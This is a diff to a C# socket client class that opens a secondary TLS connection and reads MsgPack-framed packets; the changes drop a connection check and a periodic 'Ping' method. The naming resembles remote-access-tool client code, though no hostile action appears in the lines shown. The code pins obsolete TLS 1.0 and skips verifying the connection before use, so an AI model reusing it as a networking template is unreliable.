@@ -28,7 +28,6 @@ namespace Client.Sockets
         public SslStream SslClient { get; set; }
         private byte[] Buffer { get; set; }
         private long Buffersize { get; set; }
-       // private Timer Tick { get; set; }
         private MemoryStream MS { get; set; }
         public bool IsConnected { get; set; }
         private object SendSync { get; } = new object();
@@ -47,17 +46,13 @@ namespace Client.Sockets
 
                 Client.Connect(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[1]));
 
-                if (Client.Connected)
-                {
-                    Debug.WriteLine("Temp Connected!");
-                    IsConnected = true;
-                    SslClient = new SslStream(new NetworkStream(Client, true), false, ValidateServerCertificate);
-                    SslClient.AuthenticateAsClient(Client.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
-                    Buffer = new byte[4];
-                    MS = new MemoryStream();
-                   // Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
-                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
-                }
+                Debug.WriteLine("Temp Connected!");
+                IsConnected = true;
+                SslClient = new SslStream(new NetworkStream(Client, true), false, ValidateServerCertificate);
+                SslClient.AuthenticateAsClient(Client.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
+                Buffer = new byte[4];
+                MS = new MemoryStream();
+                SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
             }
             catch
             {
@@ -80,7 +75,7 @@ namespace Client.Sockets
 
             try
             {
-               // Tick?.Dispose();
+                // Tick?.Dispose();
                 SslClient?.Dispose();
                 Client?.Dispose();
                 MS?.Dispose();
@@ -92,7 +87,7 @@ namespace Client.Sockets
         {
             try
             {
-                if (!Client.Connected || !IsConnected)
+                if (!ClientSocket.IsConnected || !IsConnected)
                 {
                     IsConnected = false;
                     Dispose();
@@ -178,13 +173,5 @@ namespace Client.Sockets
                 }
             }
         }
-
-        public void CheckServer(object obj)
-        {
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Packet").AsString = "Ping";
-            Send(msgpack.Encode2Bytes());
-        }
-
     }
 }
